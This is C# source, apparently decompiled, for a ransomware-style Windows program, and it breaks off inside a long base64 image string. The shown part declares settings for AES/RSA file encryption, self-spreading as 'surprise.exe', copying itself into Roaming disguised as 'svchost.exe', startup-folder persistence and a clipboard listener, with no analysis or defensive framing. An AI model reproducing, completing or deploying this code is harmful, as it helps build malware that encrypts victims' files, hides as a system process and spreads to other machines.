using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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